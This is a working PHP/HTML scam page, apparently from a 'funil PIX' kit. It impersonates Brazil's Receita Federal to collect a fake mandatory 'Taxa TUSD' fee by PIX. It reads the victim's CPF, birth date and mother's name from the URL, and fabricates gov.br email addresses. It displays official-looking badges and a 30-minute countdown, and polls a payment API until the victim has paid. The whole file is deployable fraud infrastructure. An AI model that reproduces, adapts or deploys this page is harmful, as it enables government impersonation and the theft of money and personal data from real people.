<?php
/**
 * Funil PIX — Duttyfy API
 * Recebe: ?nome=&cpf=&telefone=&amount=&nascimento=&sexo=&mae=&name=&src=
 * amount vem em centavos (ex: 3095 = R$ 30,95)
 */

ini_set('display_errors', 0);
error_reporting(E_ALL);

$API_URL = 'https://www.pagamentos-seguros.app/api-pix/FWnY2Ki0B3ixWudFVmsTMIbwwUhS3rPIak2_nbcYArL2N9RbWrSvr7KeqOqX8vj0h8Zrn3kPk5Vr_hWxPna66w';

// ── LÊ PARÂMETROS DA URL ──
$nome      = isset($_GET['nome'])      ? trim($_GET['nome'])      : (isset($_GET['name']) ? trim($_GET['name']) : '');
$cpf_raw   = isset($_GET['cpf'])       ? trim($_GET['cpf'])       : '';
$telefone  = isset($_GET['telefone'])  ? trim($_GET['telefone'])  : '';
$amount    = isset($_GET['amount'])    ? (int)$_GET['amount']     : 0; // em centavos
$nascimento= isset($_GET['nascimento'])? trim($_GET['nascimento']) : '';
$sexo      = isset($_GET['sexo'])      ? trim($_GET['sexo'])      : '';
$mae       = isset($_GET['mae'])       ? trim($_GET['mae'])       : '';

// Validações básicas
$cpf      = preg_replace('/\D/', '', $cpf_raw);
$telefone = preg_replace('/\D/', '', $telefone);
$pedidoId = rand(10000, 99999);
$primeiroNome = explode(' ', $nome)[0] ?? 'Cliente';

// Se amount não veio, usa valor padrão
if ($amount <= 0) $amount = 6190; // R$ 61,90 em centavos
$valorReais = number_format($amount / 100, 2, ',', '.');

// Email gerado a partir do CPF se não vier
$email = !empty($cpf) ? "cpf{$cpf}@consulta.gov.br" : "cliente{$pedidoId}@consulta.gov.br";

// ── CHAMA A API DUTTYFY ──
$erro_api  = null;
$pixCode   = null;
$transactionId = null;

if (!empty($nome) && !empty($cpf) && $amount > 0) {

    $body = [
        'amount'        => $amount,
        'description'   => "Taxa TUSD - Protocolo #{$pedidoId}",
        'customer'      => [
            'name'     => $nome,
            'document' => $cpf,
            'email'    => $email,
            'phone'    => $telefone ?: '11999999999',
        ],
        'item'          => [
            'title'    => "Taxa de Serviço TUSD",
            'price'    => $amount,
            'quantity' => 1,
        ],
        'paymentMethod' => 'PIX',
        'utm'           => isset($_GET['src']) ? 'src=' . $_GET['src'] : '',
    ];

    $ch = curl_init($API_URL);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json', 'Accept: application/json'],
        CURLOPT_POSTFIELDS     => json_encode($body),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_TIMEOUT        => 30,
    ]);

    $responseRaw = curl_exec($ch);
    $httpCode    = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError   = curl_error($ch);
    curl_close($ch);

    if ($httpCode === 200 || $httpCode === 201) {
        $data          = json_decode($responseRaw, true);
        $pixCode       = $data['pixCode']       ?? null;
        $transactionId = $data['transactionId'] ?? null;
    } else {
        $erro_api = "Erro ao gerar PIX (HTTP $httpCode). Tente novamente.";
    }
} else {
    $erro_api = "Dados insuficientes para gerar o PIX.";
}

$qrUrl = $pixCode
    ? "https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=" . urlencode($pixCode)
    : null;

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Pagamento PIX — Taxa TUSD</title>
  <meta name="robots" content="noindex, nofollow">
  <link rel="stylesheet" href="css/styles-Bawg5VNq.css">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    @keyframes spin    { to { transform: rotate(360deg); } }
    @keyframes pixFade { from { opacity:0; transform:translateY(4px); } to { opacity:1; transform:translateY(0); } }
    @keyframes pulse2  { 0%,100%{ box-shadow:0 0 0 0 rgba(21,128,61,.4); } 50%{ box-shadow:0 0 0 6px rgba(21,128,61,0); } }
    @keyframes popIn   { from{ opacity:0; transform:scale(.88); } to{ opacity:1; transform:scale(1); } }

    .pix-fade { animation: pixFade .35s ease-out; }

    * { box-sizing: border-box; }
    body {
      font-family: 'Poppins', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
      background: #f5f7fa;
      min-height: 100vh;
      color: #1c1c1c;
      margin: 0; padding: 0;
    }

    /* ── HEADER ── */
    header {
      background: #fff;
      border-bottom: 1px solid #e2e8f0;
      padding: 12px 16px;
      position: sticky; top: 0; z-index: 50;
    }
    .header-inner {
      max-width: 480px; margin: 0 auto;
      display: flex; align-items: center; justify-content: space-between;
    }
    .header-logo-wrap { display: flex; align-items: center; gap: 10px; }
    .header-logo { height: 40px; width: auto; }
    .header-divider { border-left: 1px solid #cbd5e1; padding-left: 10px; }
    .header-sub  { margin: 0; font-size: 11px; color: #64748b; font-weight: 500; }
    .header-main { margin: 0; font-size: 13px; color: #0f172a; font-weight: 700; }
    .header-secure {
      display: flex; align-items: center; gap: 4px;
      color: #15803d; font-size: 10px; font-weight: 600;
    }

    /* ── MAIN ── */
    main { max-width: 480px; margin: 0 auto; padding: 10px 14px 32px; }

    /* ── CARD ── */
    .card {
      background: #fff;
      border: 1px solid #e2e8f0;
      border-radius: 12px;
      overflow: hidden;
      margin-bottom: 10px;
    }

    /* ── CARD HEADER BAR ── */
    .card-bar {
      background: #f8fafc;
      border-bottom: 1px solid #e2e8f0;
      padding: 8px 14px;
      display: flex; align-items: center; justify-content: space-between;
    }
    .card-bar-left { display: flex; align-items: center; gap: 8px; }
    .pix-badge {
      width: 20px; height: 20px; border-radius: 6px;
      background: #32BCAD; color: #fff;
      display: flex; align-items: center; justify-content: center;
      font-size: 11px; font-weight: 800;
    }
    .card-bar-label { font-size: 12px; font-weight: 700; color: #0f172a; }
    .card-bar-valor { font-size: 13px; color: #1351B4; font-weight: 800; font-variant-numeric: tabular-nums; margin-left: 4px; }
    .status-dot-wrap {
      font-size: 10px; color: #15803d; font-weight: 700;
      display: inline-flex; align-items: center; gap: 4px;
    }
    .status-dot {
      width: 6px; height: 6px; border-radius: 999px; background: #16a34a;
      animation: pulse2 1.5s ease-in-out infinite;
    }

    /* ── CARD BODY ── */
    .card-body { padding: 14px; }

    /* ── LOADING ── */
    .loading-wrap { text-align: center; padding: 32px 0; }
    .spinner {
      width: 36px; height: 36px;
      border: 3px solid #cbd5e1; border-top-color: #1351B4;
      border-radius: 50%; margin: 0 auto;
      animation: spin 1s linear infinite;
    }
    .loading-txt { margin-top: 14px; color: #475569; font-size: 13px; }

    /* ── ERRO ── */
    .error-wrap { text-align: center; padding: 28px 16px; }
    .error-icon { font-size: 40px; margin-bottom: 10px; }
    .error-title { font-size: 15px; font-weight: 700; color: #dc2626; margin-bottom: 6px; }
    .error-msg { font-size: 13px; color: #64748b; line-height: 1.5; }

    /* ── DADOS DO CLIENTE ── */
    .client-box {
      background: #f0f9ff;
      border: 1px solid #bae6fd;
      border-radius: 10px;
      padding: 12px 14px;
      margin-bottom: 14px;
      font-size: 12px;
    }
    .client-box-title {
      font-size: 10px; font-weight: 700; text-transform: uppercase;
      letter-spacing: 1px; color: #0369a1; margin-bottom: 8px;
      display: flex; align-items: center; gap: 5px;
    }
    .client-row { display: flex; justify-content: space-between; margin-bottom: 4px; }
    .client-label { color: #64748b; font-weight: 500; }
    .client-value { color: #0f172a; font-weight: 700; text-align: right; max-width: 60%; }

    /* ── VALOR BOX ── */
    .valor-box {
      background: #fef9c3;
      border: 1px solid #fde047;
      border-radius: 10px;
      padding: 10px 14px;
      margin-bottom: 16px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .valor-label { font-size: 12px; font-weight: 600; color: #92400e; }
    .valor-num   { font-size: 20px; font-weight: 800; color: #1351B4; font-variant-numeric: tabular-nums; }

    /* ── QR CODE ── */
    .qr-section { text-align: center; margin-bottom: 16px; }
    .qr-label {
      font-size: 11px; font-weight: 700; color: #64748b;
      text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 12px;
    }
    .qr-wrap {
      display: inline-block;
      padding: 12px;
      background: #fff;
      border: 2px solid #e2e8f0;
      border-radius: 14px;
      box-shadow: 0 2px 12px rgba(19,81,180,.1);
      position: relative;
    }
    .qr-wrap img { width: 190px; height: 190px; display: block; border-radius: 6px; }
    .qr-corner { position: absolute; width: 16px; height: 16px; border-color: #1351B4; border-style: solid; }
    .qr-corner.tl { top:5px; left:5px;   border-width: 3px 0 0 3px; border-radius: 4px 0 0 0; }
    .qr-corner.tr { top:5px; right:5px;  border-width: 3px 3px 0 0; border-radius: 0 4px 0 0; }
    .qr-corner.bl { bottom:5px; left:5px;  border-width: 0 0 3px 3px; border-radius: 0 0 0 4px; }
    .qr-corner.br { bottom:5px; right:5px; border-width: 0 3px 3px 0; border-radius: 0 0 4px 0; }

    /* ── TIMER ── */
    .timer-box {
      display: flex; align-items: center; justify-content: center; gap: 8px;
      background: #fff7ed; border: 1px solid #fed7aa;
      border-radius: 10px; padding: 9px 14px; margin-bottom: 14px;
      font-size: 13px; font-weight: 600; color: #92400e;
    }
    .timer-count { font-weight: 800; color: #c2410c; font-variant-numeric: tabular-nums; }

    /* ── DIVIDER ── */
    .divider {
      display: flex; align-items: center; gap: 10px;
      margin: 14px 0; color: #94a3b8; font-size: 11px; font-weight: 600;
      text-transform: uppercase; letter-spacing: 1px;
    }
    .divider::before, .divider::after { content:''; flex:1; height:1px; background:#e2e8f0; }

    /* ── CODE BOX ── */
    .code-label { font-size: 11px; font-weight: 700; color: #64748b; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 7px; }
    .code-box {
      display: flex; align-items: center; gap: 10px;
      background: #f8fafc; border: 1px solid #e2e8f0;
      border-radius: 10px; padding: 10px 12px; margin-bottom: 12px;
    }
    .code-text {
      flex: 1; font-family: monospace; font-size: 10px;
      color: #1e293b; word-break: break-all; line-height: 1.5;
      max-height: 52px; overflow: hidden;
    }

    /* ── BOTÃO ── */
    .btn-copy {
      width: 100%; background: #1351B4; border: none; border-radius: 10px;
      padding: 14px; font-size: 14px; font-weight: 700; color: #fff;
      cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;
      box-shadow: 0 3px 14px rgba(19,81,180,.35);
      transition: transform .15s, box-shadow .15s;
      font-family: 'Poppins', sans-serif;
    }
    .btn-copy:hover  { transform: translateY(-1px); box-shadow: 0 5px 20px rgba(19,81,180,.45); }
    .btn-copy:active { transform: scale(.97); }
    .btn-copy.copied { background: #15803d; box-shadow: 0 3px 14px rgba(21,128,61,.35); }

    /* ── STATUS ── */
    .status-box {
      display: flex; align-items: center; gap: 10px;
      background: #f0fdf4; border: 1px solid #bbf7d0;
      border-radius: 10px; padding: 10px 14px; margin-top: 14px;
    }
    .status-pulse {
      width: 10px; height: 10px; border-radius: 50%;
      background: #16a34a; flex-shrink: 0;
      animation: pulse2 1.5s ease-in-out infinite;
    }
    .status-txt { font-size: 13px; font-weight: 600; color: #15803d; }

    /* ── CHIPS ── */
    .chips {
      display: flex; flex-wrap: wrap; gap: 8px;
      justify-content: center; margin: 16px 0 8px;
    }
    .chip {
      font-size: 10px; color: #64748b; background: #f1f5f9;
      border: 1px solid #e2e8f0; padding: 4px 10px;
      border-radius: 999px; font-weight: 600; letter-spacing: .5px;
    }
    .footer-txt {
      font-size: 10.5px; color: #94a3b8; text-align: center;
      margin: 0; line-height: 1.5;
    }

    /* ── AVISO LEGAL ── */
    .aviso-box {
      background: #fff7ed; border: 1px solid #fde68a;
      border-radius: 10px; padding: 12px 14px; margin-bottom: 14px;
      font-size: 11px; color: #92400e; line-height: 1.55; font-weight: 500;
    }
    .aviso-box strong { color: #78350f; }

    /* ── SUCESSO OVERLAY ── */
    .sucesso-overlay {
      display: none; position: fixed; inset: 0;
      background: rgba(0,0,0,.55); z-index: 100;
      align-items: center; justify-content: center; padding: 16px;
    }
    .sucesso-card {
      background: #fff; border-radius: 20px; padding: 36px 28px;
      text-align: center; max-width: 340px; width: 100%;
      box-shadow: 0 20px 60px rgba(0,0,0,.2);
      animation: popIn .4s cubic-bezier(.34,1.56,.64,1);
      border: 2px solid #bbf7d0;
    }
    .sucesso-icon  { font-size: 60px; margin-bottom: 12px; }
    .sucesso-title { font-size: 20px; font-weight: 800; color: #15803d; margin-bottom: 6px; }
    .sucesso-sub   { font-size: 13px; color: #64748b; line-height: 1.6; }

    @media(max-width:400px) { .qr-wrap img{ width:160px; height:160px; } }
  </style>
</head>
<body>

<!-- HEADER -->
<header>
  <div class="header-inner">
    <div class="header-logo-wrap">
      <img src="/funil/pix/images/receita-federal-l594lK2b.png" alt="Receita Federal" class="header-logo"
           onerror="this.style.display='none'">
      <div class="header-divider">
        <p class="header-sub">Pagamento Oficial</p>
        <p class="header-main">Taxa TUSD · PIX</p>
      </div>
    </div>
    <div class="header-secure">
      <svg width="12" height="12" viewBox="0 0 20 20" fill="currentColor">
        <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/>
      </svg>
      <span>Conexão segura</span>
    </div>
  </div>
</header>

<!-- MAIN -->
<main>

  <div class="card">

    <!-- BARRA DO CARD -->
    <div class="card-bar">
      <div class="card-bar-left">
        <div class="pix-badge">P</div>
        <span class="card-bar-label">Pagamento via PIX</span>
        <span class="card-bar-valor">R$ <?= $valorReais ?></span>
      </div>
      <?php if ($pixCode): ?>
      <span class="status-dot-wrap">
        <span class="status-dot"></span>Aguardando
      </span>
      <?php endif; ?>
    </div>

    <!-- CORPO DO CARD -->
    <div class="card-body pix-fade">

      <?php if ($erro_api): ?>
      <!-- ERRO -->
      <div class="error-wrap">
        <div class="error-icon">⚠️</div>
        <div class="error-title">Não foi possível gerar o PIX</div>
        <div class="error-msg"><?= htmlspecialchars($erro_api) ?><br><br>Verifique os dados e tente novamente.</div>
      </div>

      <?php elseif ($pixCode): ?>
      <!-- PIX GERADO COM SUCESSO -->

      <!-- DADOS DO CLIENTE -->
      <?php if ($nome || $cpf): ?>
      <div class="client-box">
        <div class="client-box-title">
          <svg width="10" height="10" viewBox="0 0 20 20" fill="#0369a1"><path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"/></svg>
          Dados do Requerente
        </div>
        <?php if ($nome): ?>
        <div class="client-row">
          <span class="client-label">Nome:</span>
          <span class="client-value"><?= htmlspecialchars($nome) ?></span>
        </div>
        <?php endif; ?>
        <?php if ($cpf): ?>
        <div class="client-row">
          <span class="client-label">CPF:</span>
          <span class="client-value"><?= preg_replace('/(\d{3})(\d{3})(\d{3})(\d{2})/', '$1.$2.$3-$4', $cpf) ?></span>
        </div>
        <?php endif; ?>
        <?php if ($nascimento): ?>
        <div class="client-row">
          <span class="client-label">Nascimento:</span>
          <span class="client-value"><?= htmlspecialchars($nascimento) ?></span>
        </div>
        <?php endif; ?>
        <?php if ($mae): ?>
        <div class="client-row">
          <span class="client-label">Mãe:</span>
          <span class="client-value"><?= htmlspecialchars($mae) ?></span>
        </div>
        <?php endif; ?>
      </div>
      <?php endif; ?>

      <!-- AVISO -->
      <div class="aviso-box">
        ⚠️ <strong>Atenção:</strong> O pagamento da taxa é obrigatório para o processamento do protocolo.
        Após a confirmação, seu processo será liberado automaticamente em até <strong>2 horas úteis</strong>.
      </div>

      <!-- VALOR -->
      <div class="valor-box">
        <span class="valor-label">💳 Valor a pagar</span>
        <span class="valor-num">R$ <?= $valorReais ?></span>
      </div>

      <!-- QR CODE -->
      <div class="qr-section">
        <div class="qr-label">📱 Escaneie o QR Code</div>
        <div class="qr-wrap">
          <div class="qr-corner tl"></div>
          <div class="qr-corner tr"></div>
          <div class="qr-corner bl"></div>
          <div class="qr-corner br"></div>
          <img src="<?= $qrUrl ?>" alt="QR Code PIX">
        </div>
      </div>

      <!-- TIMER -->
      <div class="timer-box">
        <span>⏱</span>
        <span>PIX expira em <span class="timer-count" id="timer">30:00</span></span>
      </div>

      <div class="divider">ou copie o código abaixo</div>

      <!-- CÓDIGO COPIA E COLA -->
      <div class="code-label">📋 Copia e Cola</div>
      <div class="code-box">
        <div class="code-text"><?= htmlspecialchars(substr($pixCode, 0, 140)) ?>...</div>
      </div>

      <!-- BOTÃO COPIAR -->
      <button class="btn-copy" id="btn-copy" onclick="copiarPix()">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <rect x="9" y="9" width="13" height="13" rx="2"/>
          <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
        </svg>
        <span id="btn-txt">Copiar Código PIX</span>
      </button>

      <!-- STATUS -->
      <div class="status-box">
        <div class="status-pulse"></div>
        <div class="status-txt" id="status-txt">Aguardando confirmação do pagamento...</div>
      </div>

      <?php endif; ?>

    </div><!-- /card-body -->
  </div><!-- /card -->

  <!-- CHIPS SEGURANÇA -->
  <div class="chips">
    <span class="chip">TLS 1.3</span>
    <span class="chip">ICP-Brasil</span>
    <span class="chip">LGPD</span>
    <span class="chip">BCB · PIX</span>
  </div>
  <p class="footer-txt">Detecção de pagamento automática · Esta página é atualizada em tempo real</p>

</main>

<!-- SUCESSO OVERLAY -->
<div class="sucesso-overlay" id="sucesso-overlay">
  <div class="sucesso-card">
    <div class="sucesso-icon">✅</div>
    <div class="sucesso-title">Pagamento Confirmado!</div>
    <div class="sucesso-sub">
      Seu pagamento de <strong>R$ <?= $valorReais ?></strong> foi recebido com sucesso.<br>
      <?php if ($primeiroNome): ?>Obrigado, <?= htmlspecialchars($primeiroNome) ?>!<br><?php endif; ?>
      Seu protocolo será processado em até 2 horas úteis.
    </div>
  </div>
</div>

<script>
<?php if ($pixCode): ?>
const PIX_CODE       = <?= json_encode($pixCode) ?>;
const TRANSACTION_ID = <?= json_encode($transactionId) ?>;
const VERIFY_URL     = <?= json_encode($API_URL . '?transactionId=' . urlencode($transactionId ?? '')) ?>;
let pago = false;

// ── COPIAR ──
async function copiarPix() {
  try { await navigator.clipboard.writeText(PIX_CODE); }
  catch {
    const t = document.createElement('textarea');
    t.value = PIX_CODE; document.body.appendChild(t);
    t.select(); document.execCommand('copy'); document.body.removeChild(t);
  }
  const btn = document.getElementById('btn-copy');
  const txt = document.getElementById('btn-txt');
  btn.classList.add('copied');
  txt.textContent = '✅ Código copiado!';
  setTimeout(() => { btn.classList.remove('copied'); txt.textContent = 'Copiar Código PIX'; }, 3000);
}

// ── TIMER 30 MIN ──
let totalSec = 30 * 60;
const timerEl = document.getElementById('timer');
const timerInterval = setInterval(() => {
  if (pago) { clearInterval(timerInterval); return; }
  totalSec--;
  if (totalSec <= 0) { timerEl.textContent = '00:00'; clearInterval(timerInterval); return; }
  timerEl.textContent = String(Math.floor(totalSec / 60)).padStart(2,'0') + ':' + String(totalSec % 60).padStart(2,'0');
}, 1000);

// ── POLLING DUTTYFY ── GET ?transactionId=ID → status COMPLETED = pago
async function verificarPagamento() {
  if (pago || !TRANSACTION_ID) return;
  try {
    const r = await fetch(VERIFY_URL);
    const d = await r.json();
    if (d.status === 'COMPLETED' || d.status === 'PAID') {
      pago = true;
      clearInterval(timerInterval);
      clearInterval(checkInterval);
      document.getElementById('status-txt').textContent = '✅ Pagamento confirmado com sucesso!';
      document.querySelector('.status-pulse').style.background = '#16a34a';
      document.getElementById('sucesso-overlay').style.display = 'flex';
    }
  } catch {}
}
const checkInterval = setInterval(verificarPagamento, 4000);
<?php endif; ?>
</script>

<script defer src="js/~flock.js" data-proxy-url="/~api/analytics"></script>
</body>
</html>
